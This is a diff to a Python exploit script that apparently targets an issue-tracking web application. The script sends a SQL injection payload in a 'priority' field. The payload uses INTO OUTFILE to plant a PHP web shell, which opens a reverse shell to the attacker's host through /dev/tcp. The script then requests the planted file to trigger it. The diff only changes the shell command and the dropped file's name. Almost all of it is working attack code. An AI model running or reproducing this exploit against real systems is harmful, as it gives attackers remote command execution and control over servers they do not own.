@@ -26,7 +26,7 @@ lport = sys.argv[4]
 
 
 # POST Request
-payload = f'''High' UNION SELECT "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"); ?>" INTO OUTFILE "/srv/http/rev.php"; --  '''
+payload = f'''High' UNION SELECT "<?php exec('/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'); ?>" INTO OUTFILE "/srv/http/s.php"; --  '''
 data = {'priority':payload}
 cookies = {'JSESSIONID':cookie}
 url = f'http://{target}:17445/issue/checkByPriority'
@@ -41,7 +41,7 @@ print("[+] Payload Sent")
 
 
 # Define Shell Interface
-shell_url = f'http://{target}:30455/rev.php'
+shell_url = f'http://{target}:30455/s.php'
 def exploit(shell_url):
     requests.get(shell_url)
 def send_exploit():
